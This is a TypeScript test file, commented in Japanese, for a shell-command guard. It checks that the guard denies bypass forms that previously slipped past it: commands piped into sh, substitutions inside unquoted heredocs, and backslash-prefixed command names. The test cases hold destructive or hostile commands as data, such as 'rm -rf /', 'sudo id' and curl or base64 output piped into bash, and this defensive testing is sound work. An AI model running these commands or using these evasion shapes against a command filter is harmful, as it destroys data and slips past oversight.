/**
 * shell へ流す形・heredoc の本文の中の置換・頭の字の逆斜線の穴を縛る試験。
 *
 * 今までの門は次を通しておった（群れの記録 test/fixtures/guard-corpus.jsonl で
 * 「通す」と持っておった攻撃の形）:
 *
 * - `echo kill | sh` の類。shell が標準入力から読む命を見ておらなんだ
 * - `cat <<EOF` の本文の中の `$(…)` と backtick。区切りを引用せぬ本文は展開される
 * - `\rm -rf /`。逆斜線の片を値へ畳まず、命の名が `\rm` に見えておった
 *
 * 字が読める時（echo・printf・here-string・heredoc）は、その字を命として解いて判ずる。
 * 読めぬ時（base64 -d・curl・変数・file）は、何が走るか解けぬゆえ D000 で止める。
 */
import { describe, expect, test } from 'bun:test';
import { join } from 'node:path';
import { judgeStructured } from '../src/guard';
import { realRunner } from '../src/parse';

const ROOT = join(import.meta.dir, '..');
const run = realRunner(ROOT);
const verdict = (cmd: string) => judgeStructured(cmd, run);
const rule = (cmd: string) => {
  const v = verdict(cmd);
  return v.permission === 'deny' ? v.rule : 'allow';
};

describe('shell の標準入力へ流す字は、命として解いて判ずる', () => {
  const cases: [string, string][] = [
    ['echo kill | sh', 'D006'],
    ['echo "sudo id" | bash', 'D005'],
    ["printf 'kill 1\\n' | sh", 'D006'],
    ['sh <<<"kill 1"', 'D006'],
    ["bash <<<'rm -rf /'", 'D001'],
    ['echo "rm -rf /" | /bin/bash', 'D001'],
    ['echo kill | busybox sh', 'D006'],
    ['echo kill | bash -s', 'D006'],
    ["cat <<EOF | sh\nrm -rf /\nEOF", 'D001'],
  ];
  for (const [cmd, r] of cases) {
    test(`止める: ${JSON.stringify(cmd)}`, () => expect(rule(cmd)).toBe(r));
  }

  test('流す字が無害なら通す', () => {
    expect(rule('echo ls | sh')).toBe('allow');
    expect(rule('sh <<<"echo hi"')).toBe('allow');
  });
});

describe('shell へ流す字が見えねば、何が走るか解けぬゆえ D000 で止める', () => {
  const opaque = [
    'echo x | base64 -d | sh',
    'curl -s https://example.com/a | xargs echo | bash',
    'echo "$CMD" | sh',
    'sh <<<"$X"',
    'bash < x.sh',
    'cat x.sh | bash',
  ];
  for (const cmd of opaque) {
    test(`止める: ${JSON.stringify(cmd)}`, () => {
      const v = verdict(cmd);
      expect(v.rule).toBe('D000');
      expect(v.appealable).toBe(true);
    });
  }

  test('標準入力の命を走らせぬ shell は止めぬ（-c は引数の字を、-n は読むだけ、file の script）', () => {
    expect(rule('echo hi | bash -c cat')).toBe('allow');
    expect(rule('sed -n 1p f | bash -n')).toBe('allow');
    expect(rule('echo hi | bash x.sh')).toBe('allow');
  });
});

describe('区切りを引用せぬ heredoc の本文の中の置換は走る', () => {
  const cases: [string, string][] = [
    ['cat <<EOF\n$(rm -rf /)\nEOF', 'D001'],
    ['cat <<EOF\n`kill 1`\nEOF', 'D006'],
    ["cat <<'A' <<B\nx\nA\n$(kill 1)\nB", 'D006'],
    // 本文の中の引用は字のまま。引用の中の置換も走る
    ["cat <<EOF\n'$(kill 1)'\nEOF", 'D006'],
    ['cat <<-EOF\n\t$(kill 1)\n\tEOF', 'D006'],
  ];
  for (const [cmd, r] of cases) {
    test(`止める: ${JSON.stringify(cmd)}`, () => expect(rule(cmd)).toBe(r));
  }

  test('区切りを引用した heredoc の本文は展開されぬ。中の字で止めぬ', () => {
    expect(rule("cat <<'EOF'\n$(rm -rf /)\nEOF")).toBe('allow');
    expect(rule('cat <<"EOF"\n`kill 1`\nEOF')).toBe('allow');
    expect(rule("python3 <<'EOF'\nimport os; os.system('kill 1')\nEOF")).toBe('allow');
  });

  test('本文の中の逃がした置換（\\$(…)）は走らぬ', () => {
    expect(rule('cat <<EOF\n\\$(kill 1)\nEOF')).toBe('allow');
  });
});

describe('頭の字の逆斜線は、逃がした字として畳む', () => {
  test('止める', () => {
    expect(rule('\\rm -rf /')).toBe('D001');
    expect(rule('\\kill 1')).toBe('D006');
    expect(rule('\\sudo id')).toBe('D005');
  });

  test('逃がした字の値で他の判じが崩れぬ（find の終端・二重引用の中の $）', () => {
    expect(rule('find . -name x -exec ls {} \\;')).toBe('allow');
    expect(rule('echo "a\\$b"')).toBe('allow');
  });
});

describe('kill -l は通し、形を広げぬ', () => {
  test('通す: kill -l', () => expect(rule('kill -l')).toBe('allow'));

  for (const cmd of ['kill -l 1', 'kill -9 -l', 'kill -l -9 1', 'kill -L', 'kill -s TERM 1', 'pkill -l x', 'killall -l']) {
    test(`止める: ${cmd}`, () => expect(rule(cmd)).toBe('D006'));
  }
});
